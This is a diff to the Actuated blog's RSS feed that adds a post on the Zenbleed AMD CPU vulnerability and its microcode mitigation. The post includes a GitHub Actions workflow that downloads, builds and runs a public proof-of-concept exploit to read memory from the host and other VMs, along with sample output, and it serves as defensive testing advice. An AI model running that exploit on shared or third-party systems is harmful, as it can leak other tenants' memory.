@@ -4,7 +4,7 @@
         <title>Actuated - blog</title>
         <link>https://actuated.dev</link>
         <description>Keep your team productive &amp; focused with blazing fast CI</description>
-        <lastBuildDate>Tue, 25 Jul 2023 13:23:45 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 31 Jul 2023 09:47:40 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <image>
@@ -12,6 +12,100 @@
             <url>https://actuated.dev/images/actuated.png</url>
             <link>https://actuated.dev</link>
         </image>
+        <item>
+            <title><![CDATA[Update your AMD hosts now to mitigate the Zenbleed exploit]]></title>
+            <link>https://actuated.dev/blog/amd-zenbleed-update-now</link>
+            <guid>https://actuated.dev/blog/amd-zenbleed-update-now</guid>
+            <pubDate>Mon, 31 Jul 2023 00:00:00 GMT</pubDate>
+            <description><![CDATA[Learn how to update the microcode on your AMD CPU to avoid the Zenbleed exploit.]]></description>
+            <content:encoded><![CDATA[<p>On 24th July 2023, <a href="https://www.theregister.com/2023/07/24/amd_zenbleed_bug/">The Register covered a new exploit</a> for certain AMD CPUs based upon the Zen architecture. The exploit, dubbed Zenbleed, allows an attacker to read arbitrary physical memory locations on the host system. It works by allowing memory to be read after it's been set to be freed up aka "use-after-free". This is a serious vulnerability, and you should update your AMD hosts as soon as possible.</p>
+<p>Even more dangerous was the claim by The Register that any level of VM isolation prevents the exploit from working. This is not true. We tested the exploit with a sample GitHub Action running within Firecracker.</p>
+<p>We ran a matrix build that creates many VMs running different versions of K3s, then we started a PoC Zenbleed exploit written by <a href="https://twitter.com/taviso">Tavis Ormandy</a>, a security researcher at Google, which scanned for 1000 pieces of data in memory.</p>
+<p>We found that the exploit was able to read the memory of the host system, and that the exploit was able to read the memory of other VMs running on the same host.</p>
+<pre><code class="hljs language-yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">build</span>
+
+<span class="hljs-attr">on:</span>
+    <span class="hljs-attr">pull_request:</span>
+        <span class="hljs-attr">branches:</span>
+        <span class="hljs-bullet">-</span> <span class="hljs-string">'*'</span>
+    <span class="hljs-attr">push:</span>
+        <span class="hljs-attr">branches:</span>
+        <span class="hljs-bullet">-</span> <span class="hljs-string">master</span>
+        <span class="hljs-bullet">-</span> <span class="hljs-string">main</span>
+    <span class="hljs-attr">workflow_dispatch:</span>
+
+<span class="hljs-attr">jobs:</span>
+    <span class="hljs-attr">build:</span>
+        <span class="hljs-attr">name:</span> <span class="hljs-string">specs</span>
+        <span class="hljs-attr">runs-on:</span> <span class="hljs-string">actuated</span>
+        <span class="hljs-attr">steps:</span>
+        <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v1</span>
+        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Download</span> <span class="hljs-string">exploit</span>
+          <span class="hljs-attr">run:</span> <span class="hljs-string">|
+            curl -L -S -s -O https://lock.cmpxchg8b.com/files/zenbleed-v5.tar.gz
+            tar -xvf zenbleed-v5.tar.gz
+            sudo apt install -qy build-essential make nasm
+</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">exploit</span>
+          <span class="hljs-attr">run:</span> <span class="hljs-string">|
+            cd zenbleed
+            make
+            chmod +x ./zenbleed
+</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">exploit</span> <span class="hljs-string">for</span> <span class="hljs-number">1000 </span><span class="hljs-string">pieces</span> <span class="hljs-string">of</span> <span class="hljs-string">data</span>
+          <span class="hljs-attr">run:</span> <span class="hljs-string">|
+            ./zenbleed/zenbleed -m 1000
+</span></code></pre>
+<p>Full details of the exploit can be found on a microsite created by the security researcher who discovered the vulnerability.</p>
+<p><a href="https://lock.cmpxchg8b.com/zenbleed.html#vulnerability">Zenbleed by Tavis Ormandy</a></p>
+<p>We didn't see any secrets printed out during the scan, but we did see part of a public SSH key, console output from etcd running within K3s, and instructions from containerd. So we can assume anything that was within memory within one of the other VMs on the host, or even the host itself, could be read by the exploit.</p>
+<p><img src="/images/2023-07-zenbleed/gha.png" alt="GHA output from the zenbleed exploit"></p>
+<blockquote>
+<p>GHA output from the zenbleed exploit</p>
+</blockquote>
+<h2>Mitigation</h2>
+<p>AMD has already released a mitigation for the Zenbleed exploit, which requires an update to the CPU's microcode.</p>
+<p><a href="https://www.linkedin.com/in/edwardvielmetti/">Ed Vielmetti</a>, Developer Partner Manager at Equinix told us that mitigation is three-fold:</p>
+<ol>
+<li>There is an incoming BIOS update from certain vendors that will update the microcode.</li>
+<li>Updating some OSes like the Ubuntu 20.04 and 22.04 will upgrade the microcode of the CPU.</li>
+<li>There is a <a href="https://www.reddit.com/r/linux/comments/15903hr/zenbleed_a_useafterfree_in_amd_zen2_processors/">"chicken bit"</a> that can be enabled which prevents the exploit from working.</li>
+</ol>
+<p>I probably don't need to spell this out, but a system update looks like the following, and the reboot is required:</p>
+<pre><code class="hljs language-bash">sudo apt update -qy &#x26;&#x26; \
+    sudo apt upgrade -yq &#x26;&#x26; \
+    sudo reboot 
+</code></pre>
+<p><img src="/images/2023-07-zenbleed/microcode.png" alt="An update to the CPU microcode is required"></p>
+<p>For some unknown reason, both of the Equinix AMD hosts that we use internally broke after running the OS upgrade, so I had to reinstall Ubuntu 22.04 using the dashboard. If for whatever reason the machine won't come up after the microcode update, then you should reinstall the Operating System (OS) using your vendor's rescue system or out of band console, both Equinix Metal and Hetzner have an "easy button" that you can click for this. If there is still an issue after that, reach out to your vendor's support team.</p>
+<p>We offer 500 USD of free credit for new Equinix Metal customers to use with actuated, and Equinix Metal have also written up their own guide on workaround here:</p>
+<ul>
+<li><a href="https://deploy.equinix.com/blog/an-update-on-the-amd-zen-2-cpu-vulnerability/">An Update On the AMD Zen 2 CPU Vulnerability</a></li>
+</ul>
+<h2>Verifying the mitigation</h2>
+<p>Since actuated VMs use Firecracker, you should run the above workflow before and after to verify the exploit was a) present and b) mitigated.</p>
+<p><img src="/images/2023-07-zenbleed/mitigated.png" alt="What it looks like when the mitigation is in place"></p>
+<blockquote>
+<p>Above: What it looks like when the mitigation is in place</p>
+</blockquote>
+<p>You can also run the exploit on the host by copying and pasting the commands from the GitHub Action above.</p>
+<p>My workstation uses a Ryzen 9 CPU, so when I ran the exploit I just saw a blocking message instead of memory regions:</p>
+<pre><code class="hljs language-bash">$ grep <span class="hljs-string">"model name"</span> /proc/cpuinfo |<span class="hljs-built_in">uniq</span>
+model name	: AMD Ryzen 9 5950X 16-Core Processor
+
+./zenbleed -m 100
+*** EMBARGOED SECURITY ISSUE --  DO NOT DISTRIBUTE! ***
+ZenBleed Testcase -- taviso@google.com
+
+NOTE: Try -h to see configuration options
+
+Spawning 32 Threads...
+Thread 0x7fd0d40e8700 running on CPU 0
+Thread 0x7fd0d38e7700 running on CPU 1
+...
+</code></pre>
+<h2>Wrapping up</h2>
+<p>Actuated uses Firecracker, an open source Virtual Machine Manager that works with Linux KVM to run isolated systems on a host. We have verified that the exploit works on Firecracker, and that the mitigation works too. So whilst VM-level isolation and an immutable filesystem is much more appropriate than a container for CI, this is an example of why we must still be vigilant and ready to respond to security vulnerabilities.</p>
+<p>This is an unfortunate, and serious vulnerability. It affects bare-metal, VMs and containers, which is why it's important to update your systems as soon as possible.</p>]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Automate Packer Images with QEMU and Actuated]]></title>
             <link>https://actuated.dev/blog/automate-packer-qemu-image-builds</link>
